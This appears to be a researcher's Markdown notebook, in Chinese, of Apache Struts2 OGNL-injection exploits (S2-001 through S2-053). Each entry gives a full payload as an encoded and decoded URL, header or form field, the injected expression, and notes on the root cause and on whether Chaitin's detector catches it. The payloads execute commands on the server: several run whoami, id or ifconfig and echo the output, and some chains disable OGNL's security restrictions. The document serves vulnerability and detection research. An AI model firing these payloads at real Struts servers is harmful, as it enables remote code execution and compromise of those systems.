<!-- Authorized by Frank -->
- [s2-001](#s2-001)
  - [payload](#payload)
  - [injection](#injection)
  - [result](#result)
- [s2-003](#s2-003)
  - [payload](#payload-1)
  - [injection](#injection-1)
  - [result](#result-1)
- [s2-005](#s2-005)
  - [payload](#payload-2)
  - [injection](#injection-2)
  - [result](#result-2)
- [s2-007](#s2-007)
  - [payload](#payload-3)
  - [injection](#injection-3)
  - [result](#result-3)
- [s2-009](#s2-009)
  - [payload](#payload-4)
  - [injection](#injection-4)
  - [result](#result-4)
- [s2-012](#s2-012)
  - [payload](#payload-5)
  - [injection](#injection-5)
  - [result](#result-5)
- [s2-013](#s2-013)
  - [payload](#payload-6)
  - [injection](#injection-6)
  - [result](#result-6)
- [s2-015](#s2-015)
  - [payload](#payload-7)
  - [injection](#injection-7)
  - [result](#result-7)
- [s2-016](#s2-016)
  - [payload](#payload-8)
  - [injection](#injection-8)
  - [result](#result-8)
- [s2-029](#s2-029)
  - [payload](#payload-9)
  - [injection](#injection-9)
  - [result](#result-9)
- [s2-032](#s2-032)
  - [payload](#payload-10)
  - [injection](#injection-10)
  - [result](#result-10)
- [s2-045](#s2-045)
  - [payload](#payload-11)
  - [injection](#injection-11)
  - [result](#result-11)
- [s2-048](#s2-048)
  - [payload](#payload-12)
  - [injection](#injection-12)
  - [result](#result-12)
- [s2-053](#s2-053)
  - [payload](#payload-13)
  - [injection](#injection-13)
  - [result](#result-13)



## s2-001

### payload
```js
// 简易无回显
%{@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app/")}

// 重写response实现命令回显
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

### injection
```js
// 简易无回显
%{@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app/")}

// 重写
#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "whoami"})).redirectErrorStream(true).start()
```

### result
* 长亭的检测结果与注入漏洞成因一致


## s2-003

### payload
```
http://www.glassy.com/test.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(a)(b)&('\u0040java.lang.Runtime@getRuntime().exec(\'open\u0020/Applications/Notes.app/\')')(a)(b)
```

### injection
```js
// 解码前
('\u0040java.lang.Runtime@getRuntime().exec(\'open\u0020/Applications/Notes.app/\')')(a)(b)
// 解码后
('@java.lang.Runtime@getRuntime().exec(\'open /Applications/Notes.app/\')')(a)(b)
```

### result
* 长亭的检测结果与注入漏洞成因一致，但是去掉限制语句依然可以检测出来
  
* 如果是调用的 OgnlUtil.getValue() 方法，则以下可以执行java代码：
  - (java code)
  - (java code)(a)
  - (a)(java code)
  - (java code)(a)(b)
  - (a)(java code)(b)
 
* 如果是调用的 OgnlUtil.setValue() 方法，则以下可以执行java代码：
  - (java code)(a)
  - (a)(java code)
  - (java code)(a)(b)
  - (a)(java code)(b)


## s2-005

### payload
```
http://www.glassy.com/test.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(a)(b)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(a)(b)&('\u0023_memberAccess.allowStaticMethodAccess\u003dfalse')(a)(b)&('\u0040java.lang.Runtime@getRuntime().exec(\'open\u0020/Applications/Notes.app/\')')(a)(b)
```

### injection
```js
('@java.lang.Runtime@getRuntime().exec('open /Applications/Notes.app/')')(a)(b)
```

### result
* 长亭的检测结果与注入漏洞成因一致
* 在s2-003的基础上，绕过官方的安全配置（禁止静态方法调用和类方法执行，前三步），再次造成漏洞。


## s2-007

### payload
```js
// 解码前
user.name=glassy&user.age=12&user.birthDay=%27%2b(%23_memberAccess.allowStaticMethodAccess%3dtrue%2c%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%40java.lang.Runtime%40getRuntime().exec(%27%2fApplications%2fNotes.app%2fContents%2fMacOS%2fNotes%27))%2b%27&user.email=31312%40qq.com

// 解码后
user.name=glassy&user.age=12&user.birthDay='+(#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Runtime@getRuntime().exec('/Applications/Notes.app/Contents/MacOS/Notes'))+'&user.email=31312@qq.com
```

### injection
```js
#_memberAccess.allowStaticMethodAccess=true,
@java.lang.Runtime@getRuntime().exec('/Applications/Notes.app/Contents/MacOS/Notes')
```

### result
* birthDay 类型限制且转换出错，会把出错的参数值带入 Ognl.getValue()
* 单单执行 `injection` 最后一句话，不是注入，必须至少有第一句话才是注入
* 长亭的检测结果与注入漏洞成因无关


## s2-009

### payload
```properties
# 解码前
http://www.glassy.com/test.action?password=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27/Applications/Notes.app/Contents/MacOS/Notes%27%29%29%28meh%29&z[%28password%29%28meh%29]=true

# 解码后
http://www.glassy.com/test.action?password=(#context["xwork.MethodAccessor.denyMethodExecution"]=+new+java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]=+new+java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('/Applications/Notes.app/Contents/MacOS/Notes'))(meh)&z[(password)(meh)]=true
```

### injection
```js
@java.lang.Runtime@getRuntime().exec('/Applications/Notes.app/Contents/MacOS/Notes')
```

### result
* ognl.setValue(key, context, value), password = (ognl expression), z[(password)(meh)] = true, (password)(meh)会进行表达式解析 
* 长亭的检测结果与注入漏洞成因无关


## s2-012

### payload
```js
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "open /Applications/Notes.app/"})).start()}
```

### injection
```js
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "open /Applications/Notes.app/"})).start()}
```

### result
* 重定向参数放入 ognl.setValue() 中
* 长亭的检测结果与注入漏洞成因无关


## s2-013

### payload
```properties
# 解码前
http://www.glassy.com/Struts2Demo_war_exploded/hello.jsp?fakeParam=%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%22%2fbin%2fbash%22%2c+%22-c%22%2c+%22open+%2fApplications%2fNotes.app%2f%22%7d)).start()%7d

# 解码后
http://www.glassy.com/Struts2Demo_war_exploded/hello.jsp?fakeParam=%{#a=(new+java.lang.ProcessBuilder(new+java.lang.String[]{"/bin/bash",+"-c",+"open+/Applications/Notes.app/"})).start()}
```

### injection
```js
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "open+/Applications/Notes.app/"})).start()}
```

### result
* 计算标签中action路径时，会把参数值带入 ognl.getvalue
* 长亭的检测结果与注入漏洞成因无关


## s2-015

### payload
```properties
# 解码前
http://www.glassy.com/Struts2Demo_war_exploded/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action

# 解码后
http://www.glassy.com/Struts2Demo_war_exploded/${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream()),#q}.action
```

### injection
```js
#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream())
```

### result
* 与 s2-013 相同，计算重定向url的时候会把action的值放入 ognl.getvalue
* 长亭的检测结果与注入漏洞成因无关


## s2-016

### payload
```properties
# 解码前
http://www.glassy.com/Struts2Demo_war_exploded/hello.action?redirect:%24%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%27%2fbin%2fbash%27%2c+%27-c%27%2c%27open+%2fApplications%2fNotes.app%2f%27%7d)).start()%7d

# 解码后
http://www.glassy.com/Struts2Demo_war_exploded/hello.action?redirect:${#a=(new+java.lang.ProcessBuilder(new+java.lang.String[]{'/bin/bash',+'-c','open+/Applications/Notes.app/'})).start()}
```

### injection
```js
${#a=(new+java.lang.ProcessBuilder(new+java.lang.String[]{'/bin/bash',+'-c','open+/Applications/Notes.app/'})).start()}
```

### result
* 使用 `action:`, `redirect:`, `redirectAction:` 作为前缀参数，后面会解析表达式
* 长亭的检测结果与注入漏洞成因无关


## s2-029

### payload
```properties
# 解码前
http://www.glassy.com/Struts2Demo_war_exploded/s2029.action?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('open%20/Applications/Notes.app/').getInputStream()))

# 解码后
http://www.glassy.com/Struts2Demo_war_exploded/s2029.action?message=(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('open /Applications/Notes.app/').getInputStream()))
```

### injection
```js
@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('open /Applications/Notes.app/').getInputStream())
```

### result
* jsp 标签属性值中的参数值
* 长亭的检测结果与注入漏洞成因无关


## s2-032

### payload
```properties
# 解码前
http://www.glassy.com/struts2-showcase/home11.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D),d&cmd=/Applications/Notes.app/Contents/MacOS/Notes

# 解码后
http://www.glassy.com/struts2-showcase/home11.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]),d&cmd=/Applications/Notes.app/Contents/MacOS/Notes
```

### injection
```js
#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]),d&cmd=/Applications/Notes.app/Contents/MacOS/Notes
```

### result
* 长亭的检测结果与注入漏洞成因无关


## s2-045

### payload
```js
Content-Type:%{(#glassy='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}
```

### injection
```js
Content-Type:%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}
```

### result
* 上传文件出错且错误信息中带 %{exp} 时， exp 会带入 ognl.getValue
* 长亭的检测结果与注入漏洞成因无关


## s2-048

### payload
```js
name=${(#glassy='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}&age=11&__checkbox_bustedBefore=true&description=22

%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):
 
((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
 
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
 
(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
 
(#context.setMemberAccess(#dm)))).
 
(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
```

### injection
```js
${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}
```

### result
* ActionMessage 的 key 传给 ognl.getValue
* 长亭的检测结果与注入漏洞成因无关


## s2-053

### payload
```properties
# 解码前
http://www.glassy.com/Struts2Demo_war_exploded/s2053.action?name=%25%7b(%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23a%3d(new+java.lang.ProcessBuilder(%27%2fApplications%2fNotes.app%2fContents%2fMacOS%2fNotes%27)).start())%7d

# 解码后
http://www.glassy.com/Struts2Demo_war_exploded/s2053.action?name=%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new+java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}
```

### injection
```js
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new+java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}
```

### result
* Freemarker 标签属性中的参数值传入 ognl.getvalue 中
* 长亭的检测结果与注入漏洞成因无关